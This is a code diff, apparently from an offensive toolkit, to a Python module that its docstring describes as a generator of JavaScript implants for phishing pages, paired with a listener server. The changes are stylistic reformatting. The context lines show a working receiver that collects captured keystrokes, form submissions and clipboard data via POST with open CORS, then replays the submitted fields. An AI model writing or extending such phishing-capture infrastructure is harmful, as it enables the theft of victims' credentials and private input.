@@ -5,7 +5,11 @@ Generates minimal JS implants that capture keystrokes, form fills,
 clipboard, and DOM mutations from a phishing page — like Clarity but offensive.
 Includes a Python listener server that receives and replays sessions.
 """
-import os, json, time, base64, threading
+import os
+import json
+import time
+import base64
+import threading
 from http.server import HTTPServer, BaseHTTPRequestHandler
 from typing import Callable, Optional
 from shadowcypher.core.logger import logger
@@ -145,7 +149,8 @@ class SessionMonitorListener:
         with self._lock:
             batches = self._sessions.get(session_id, [])
         if not batches:
-            if on_output: on_output(f"[CAPTURE] No session: {session_id}\n")
+            if on_output:
+                on_output(f"[CAPTURE] No session: {session_id}\n")
             return
         if on_output:
             on_output(f"\n[CAPTURE] SESSION REPLAY: {session_id}\n{'='*60}\n")
@@ -153,7 +158,7 @@ class SessionMonitorListener:
             for ev in batch.get("e", []):
                 tp = ev.get("tp")
                 d = ev.get("d", {})
-                ts = ev.get("ts", 0)
+                _ = ev.get("ts", 0)
                 if tp == "form":
                     if on_output:
                         on_output(f"[FORM SUBMIT] action={d.get('action')} fields={d.get('fields')}\n")
@@ -191,7 +196,9 @@ class SessionMonitorListener:
 
             def do_POST(self):
                 if self.path != "/c":
-                    self.send_response(404); self.end_headers(); return
+                    self.send_response(404)
+                    self.end_headers()
+                    return
                 try:
                     length = int(self.headers.get("Content-Length", 0))
                     body = self.rfile.read(length)
@@ -203,13 +210,16 @@ class SessionMonitorListener:
                             logger.info("session_monitor", f"NEW_SESSION: {sid}")
                         listener._sessions[sid].append(data)
                     if listener._on_event:
-                        try: listener._on_event(sid, data)
-                        except Exception: pass
+                        try:
+                            listener._on_event(sid, data)
+                        except Exception:
+                            pass
                     self.send_response(204)
                     self.send_header("Access-Control-Allow-Origin", "*")
                     self.end_headers()
                 except Exception:
-                    self.send_response(400); self.end_headers()
+                    self.send_response(400)
+                    self.end_headers()
 
             def do_OPTIONS(self):
                 self.send_response(204)
